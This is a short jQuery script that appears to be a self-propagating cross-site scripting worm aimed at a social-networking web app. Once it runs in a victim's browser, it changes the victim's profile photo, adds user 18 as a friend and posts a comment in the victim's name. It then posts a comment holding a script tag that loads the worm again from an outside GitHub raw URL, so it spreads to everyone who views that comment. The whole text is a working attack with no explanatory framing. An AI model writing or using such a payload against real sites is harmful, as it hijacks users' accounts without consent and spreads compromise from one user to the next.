$( document ).ready(function() {
		$.ajax({url: "/change_photo.php?type=profile&url=https://imageproxy.ifunny.co/crop:x-20,resize:640x,quality:90x75/images/2d7b2d7748ffa41a2de2d413dee50b5020f9abead83968460a274f408d195c3e_1.jpg", success: function(result){console.log(result);}});
		$.ajax({url: "/add_friend.php?id=18", success: function(result){
				console.log(result);
				if(result == "True - Friend Added Successfully"){
						var cmnt = "BFFs since: ";
						var d = new Date();
						cmnt += d.getMonth()+1+"/"+d.getDate()+"/"+d.getFullYear()+" "+d.getHours()+":"+d.getMinutes();
						console.log(cmnt);
						$.ajax({url: "/add_comment.php?id=18" + "&comment=" + cmnt, success: function(result){console.log(result);}});
						var wrm = "<script src=\"https://raw.githubusercontent.com/Loudon-M/merrychristmas/main/notobfuscated.js\"></script>"
						$.ajax({url: "/add_comment.php?comment=" + wrm, success: function(result){console.log(result);}});
					}
				}});
});
